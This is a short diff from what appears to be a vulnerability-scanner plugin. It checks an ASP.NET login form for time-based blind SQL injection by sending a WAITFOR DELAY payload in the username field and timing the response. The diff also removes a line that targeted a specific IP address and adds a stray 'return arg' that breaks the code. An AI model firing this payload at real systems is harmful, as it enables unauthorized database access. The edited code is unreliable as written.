@@ -42,6 +42,7 @@ __VIEWSTATE='''+view_state+'''&TxtUserName=asdasd');WAITFOR DELAY '0:0:'''+str(s
     if code1==200 and code2==200 and timeb - timea > 4.5:
         security_hole(preWork)
 
-if __name__ == '__main__':
+
+        return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign("soffice", 'http://117.40.152.139:800/')[1])
